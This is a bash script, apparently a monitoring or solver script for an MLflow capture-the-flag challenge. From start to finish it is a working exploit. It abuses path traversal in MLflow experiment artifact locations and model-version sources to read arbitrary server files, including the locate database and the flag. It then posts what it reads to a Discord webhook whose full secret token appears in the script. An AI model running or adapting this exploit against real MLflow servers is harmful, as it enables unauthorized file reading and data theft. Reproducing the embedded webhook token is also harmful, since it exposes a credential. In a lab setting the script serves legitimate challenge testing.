#!/bin/bash
# God mizu said : https://huntr.com/bounties/11209efb-0f84-482f-add0-587ea6b7e850
# And lalu said : Use jq more often ffs ! <3

# Setup & Monitoring
export SLACK_WEBHOOK=https://discord.com/api/webhooks/1225465528831705191/DTZo27baQ0YzAiiN2hMO-T4GxjO5PufT9CqvmLGO-ulpGtbmYIxh4t26pbtAwy1Vw-SY
cd /opt/sthack-2024-challs/do-your-updates-son

## STAGE 1: FIND FLAG
name="poc-$(date +%s%3N)"
# Create a malicious experiment:
exp_id=$(curl -sS -X POST -H 'Content-Type: application/json' -d '{"name": "'"$name"'", "artifact_location": "http:///?/../../../../../../../../../../../../../../var/"}' 'http://mlflow:5000/ajax-api/2.0/mlflow/experiments/create' | jq -r .experiment_id)

# Associate a run to it:
run_id=$(curl -sS -X POST -H 'Content-Type: application/json' -d '{"experiment_id": "'"$exp_id"'"}' 'http://mlflow:5000/api/2.0/mlflow/runs/create' | jq -r .run.info.run_id)

# Create a registered model:
curl -sS -X POST -H 'Content-Type: application/json' -d '{"name": "'"$name"'"}' 'http://mlflow:5000/ajax-api/2.0/mlflow/registered-models/create' | jq

# Link a model version to the malicious run:
curl -sS -X POST -H 'Content-Type: application/json' -d '{"name": "'"$name"'", "run_id": "'"$run_id"'", "source": "file:///var/"}' 'http://mlflow:5000/ajax-api/2.0/mlflow/model-versions/create' | jq

# Read /var/cache/locate/locatedb:
curl -sS 'http://mlflow:5000/model-versions/get-artifact?path=cache/locate/locatedb&name='"$name"'&version=1' -o /tmp/outfile
flag_path=$(grep ./flag:/flag docker-compose.yml | grep -ioP '[^/]+$' | cut -d: -f1)
grep -iaFo "$flag_path" /tmp/outfile
if [ $? -ne 0 ]; then
    echo "Flag path not found"
    curl -sS "$SLACK_WEBHOOK" -d 'content=`mlflow: Flag path not found`'
else
    curl -sS "$SLACK_WEBHOOK" -d 'content=`mlflow: Flag path found: '"$flag_path"'`'
fi
rm /tmp/outfile

## STAGE 2: READ FLAG
name="poc-$(date +%s%3N)"
# Create a malicious experiment:
exp_id=$(curl -sS -X POST -H 'Content-Type: application/json' -d '{"name": "'"$name"'", "artifact_location": "http:///?/../../../../../../../../../../../../../../flag/"}' 'http://mlflow:5000/ajax-api/2.0/mlflow/experiments/create' | jq -r .experiment_id)

# Associate a run to it:
run_id=$(curl -sS -X POST -H 'Content-Type: application/json' -d '{"experiment_id": "'"$exp_id"'"}' 'http://mlflow:5000/api/2.0/mlflow/runs/create' | jq -r .run.info.run_id)

# Create a registered model:
curl -sS -X POST -H 'Content-Type: application/json' -d '{"name": "'"$name"'"}' 'http://mlflow:5000/ajax-api/2.0/mlflow/registered-models/create' | jq

# Link a model version to the malicious run:
curl -sS -X POST -H 'Content-Type: application/json' -d '{"name": "'"$name"'", "run_id": "'"$run_id"'", "source": "file:///flag/"}' 'http://mlflow:5000/ajax-api/2.0/mlflow/model-versions/create' | jq

# Read /flag/flag_random_path_XXXX
curl -sS 'http://mlflow:5000/model-versions/get-artifact?path='"$flag_path"'&name='"$name"'&version=1' -o /tmp/outfile

flag=$(cat flag)
grep -F "$flag" /tmp/outfile
if [ $? -ne 0 ]; then
    echo "Flag content not found"
    curl -sS "$SLACK_WEBHOOK" -d 'content=`mlflow: Flag content not found`'
else
    curl -sS "$SLACK_WEBHOOK" -d 'content=`mlflow: Flag found: '"$flag"'`'
fi
rm /tmp/outfile
curl -sS "$SLACK_WEBHOOK" -d 'content=`mlflow: Now rebooting`'